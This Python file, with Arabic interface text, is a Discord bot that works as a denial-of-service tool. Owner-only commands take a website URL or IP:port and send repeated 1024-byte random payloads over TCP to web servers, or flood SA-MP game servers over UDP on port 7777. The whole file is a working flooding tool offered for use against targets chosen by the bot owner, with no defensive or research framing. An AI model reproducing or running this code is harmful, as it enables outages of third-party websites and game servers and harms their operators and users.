import random
import socket
import discord
from discord.ext import commands
from urllib.parse import urlparse

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

OWNER_ID = 1253081964479512680

class AttackChoiceView(discord.ui.View):
    def __init__(self):
        super().__init__()

    @discord.ui.button(label="Web Attack", style=discord.ButtonStyle.success, row=0)
    async def web_attack(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("اختر نوع الهجوم على المواقع.", ephemeral=True)
        await interaction.message.edit(content="أدخل الرابط أو IP للهجوم:", view=WebAttackInputView())

    @discord.ui.button(label="SAMP Attack", style=discord.ButtonStyle.primary, row=1)
    async def samp_attack(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("اختر نوع الهجوم على خوادم SAMP.", ephemeral=True)
        await interaction.message.edit(content="أدخل IP و PORT للهجوم:", view=SampAttackInputView())

class WebAttackInputView(discord.ui.View):
    def __init__(self):
        super().__init__()

    @discord.ui.button(label="أدخل رابط الموقع", style=discord.ButtonStyle.primary, row=0)
    async def input_web_url(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("أدخل رابط الموقع في الدردشة للهجوم عليه.", ephemeral=True)

    @discord.ui.button(label="أدخل IP و PORT", style=discord.ButtonStyle.secondary, row=1)
    async def input_ip_port(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("أدخل IP و PORT (مثال: 192.168.1.1:80).", ephemeral=True)

class SampAttackInputView(discord.ui.View):
    def __init__(self):
        super().__init__()

    @discord.ui.button(label="أدخل رابط SAMP", style=discord.ButtonStyle.primary, row=0)
    async def input_samp_url(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("أدخل رابط خادم SAMP في الدردشة.", ephemeral=True)

    @discord.ui.button(label="أدخل IP و PORT لـ SAMP", style=discord.ButtonStyle.secondary, row=1)
    async def input_samp_ip_port(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("أدخل IP و PORT (مثال: 192.168.1.1:7777).", ephemeral=True)

@bot.command()
async def attack(ctx):
    if ctx.author.id != OWNER_ID:
        await ctx.send("ليس لديك صلاحية تنفيذ هذا الأمر.")
        return
    view = AttackChoiceView()
    await ctx.send("اختر نوع الهجوم:", view=view)

@bot.command()
async def web_attack(ctx, url: str = None, ip_port: str = None, times: int = 100):
    if ctx.author.id != OWNER_ID:
        await ctx.send("ليس لديك صلاحية تنفيذ هذا الأمر.")
        return
    try:
        if url:
            if not url.startswith(("http://", "https://")):
                url = "http://" + url
            parsed = urlparse(url)
            hostname = parsed.hostname
            port = parsed.port or (443 if parsed.scheme == "https" else 80)
            ip = socket.gethostbyname(hostname)
            await ctx.send(f"الهجوم على {hostname} بدأ. IP: {ip} - Port: {port} - مرات: {times}.")
            await web_attack_method(ip, port, times)
        elif ip_port:
            ip, port = ip_port.split(":")
            port = int(port)
            await ctx.send(f"الهجوم على {ip}:{port} بدأ. مرات: {times}.")
            await web_attack_method(ip, port, times)
        else:
            await ctx.send("يرجى إدخال رابط أو IP:PORT.")
    except socket.gaierror:
        await ctx.send("خطأ في الاتصال - تحقق من صحة IP أو الرابط.")
    except Exception as e:
        await ctx.send(f"حدث خطأ: {e}")

async def web_attack_method(ip, port, times):
    try:
        data = random._urandom(1024)
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((ip, port))
            for _ in range(times):
                s.send(data)
        print(f"[+] Web attack sent to {ip}:{port}")
    except Exception as e:
        print(f"[!] Web attack error: {e}")

@bot.command()
async def samp(ctx, url: str = None, ip_port: str = None, times: int = 100):
    if ctx.author.id != OWNER_ID:
        await ctx.send("ليس لديك صلاحية تنفيذ هذا الأمر.")
        return
    try:
        if url:
            if not url.startswith(("http://", "https://")):
                url = "http://" + url
            parsed = urlparse(url)
            hostname = parsed.hostname
            port = parsed.port or 7777
            ip = socket.gethostbyname(hostname)
            await ctx.send(f"الهجوم على سيرفر SAMP {hostname} - IP: {ip} - Port: {port} - مرات: {times}.")
            await samp_attack_method(ip, port, times)
        elif ip_port:
            ip, port = ip_port.split(":")
            port = int(port)
            await ctx.send(f"الهجوم على {ip}:{port} بدأ. مرات: {times}.")
            await samp_attack_method(ip, port, times)
        else:
            await ctx.send("يرجى إدخال رابط أو IP:PORT.")
    except Exception as e:
        await ctx.send(f"حدث خطأ: {e}")

async def samp_attack_method(ip, port, times):
    try:
        data = random._urandom(1024)
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            for _ in range(times):
                s.sendto(data, (ip, port))
        print(f"[+] SAMP attack sent to {ip}:{port}")
    except Exception as e:
        print(f"[!] SAMP attack error: {e}")

if __name__ == "__main__":
    token = input("أدخل توكن البوت: ")  # تطلب منك إدخال التوكن عند بدء التشغيل
    bot.run(token)
